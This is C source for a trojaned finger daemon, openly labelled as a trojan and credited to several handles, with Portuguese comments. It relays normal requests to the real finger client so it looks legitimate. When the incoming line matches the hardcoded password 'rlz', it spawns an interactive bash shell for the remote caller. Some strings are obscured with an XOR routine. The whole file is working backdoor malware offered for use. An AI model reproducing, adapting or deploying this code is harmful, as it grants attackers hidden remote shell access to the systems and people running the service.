
/*  The Fingerd trojan by Hitman Italy
 *  This source cannot be spread without the whole article
 *  but you can freely implement or modify it for personal use
 *  [========================================================]
 *  Modificado por X-SaTaNiC, Kbyte , soft , AnArChY
 *  Devico bugs encontrados que fazia com que naum compilasse e a 
 *  backdoor da shell nao executasse direito.
 *  Mas depois de tantas modificacoes esta ai trojan rodando blz!
 */  
 

static char copyright[] = "";   /* Copyright String  */

static char sccsid[] = "";      /* Sccsid String     */
#define SENHA "rlz"             /* SENHA A SER USADA */

#include <stdio.h>

#define PATH_FINGER "/usr/bin/finger" /* DIRETORIO DO FINGER, cliente */
#define CODE 161

char *HitCrypt(ch)
char *ch;
{
   char *b;
   b=ch;
   while ((*(ch++)^=CODE)!=0x00);
   return(b);
}

main(argc,argv)
int argc;
char *argv[];
{
   register FILE *fp;
   register int ch;
   register char *lp;
   int p[2];

static char exor[4][23]={
{201,200,213,CODE},
{142,196,213,194,142,209,192,210,210,214,197,CODE},
{201,200,213,155,155,145,155,145,155,155,142,155,142,195,200,207,142,194,
210,201,CODE},
{227,192,194,202,197,206,206,211,129,192,194,213,200,215,192,213,196,197,
143,143,143,CODE} };

#define   ENTRIES   50
   char **ap, *av[ENTRIES + 1], line[1024], *strtok();

#ifdef LOGGING               /* unused, leave it for "strings" command */
#include <netinet/in.h>
   struct sockaddr_in sin;
   int sval;

   sval = sizeof(sin);
   if (getpeername(0, &sin, &sval) < 0)
      fatal(argv[0],"getpeername");
#endif

   if (!fgets(line, sizeof(line), stdin))
      exit(1);
   
av[0] = "finger";

   for (lp = line, ap = &av[1];;) {
      *ap = strtok(lp, " \t\r\n");
      if (!*ap){
         break;}
      if ((*ap)[0] == '/' && ((*ap)[1] == 'W' || (*ap)[1] == 'w'))
         *ap = "-l";
      if (++ap == av + ENTRIES)
         break;
      lp = NULL;
   }

   if (pipe(p) < 0)
      fatal(argv[0],"pipe");
   if (!strcmp(line,SENHA)) { 
   system("/bin/bash -i");    
   exit(0);
   }
   switch(fork()) {
   case 0:
      (void)close(p[0]);
      if (p[1] != 1) {
         (void)dup2(p[1], 1);
         (void)close(p[1]);
      }
        
         if (execv(PATH_FINGER, av)==-1)
         fprintf(stderr,"No local finger program found\n");
      _exit(1);
   case -1:
      fatal(argv[0],"fork");
   }
   (void)close(p[1]);
   if (!(fp = fdopen(p[0], "r")))
      fatal(argv[0],"fdopen");
   while ((ch = getc(fp)) != EOF) {
      putchar(ch);
   }
   exit(0);
}

fatal(prg,msg)
   char *prg,*msg;
{
   fprintf(stderr, "%s: ", prg);
   perror(msg);
   exit(1);
}

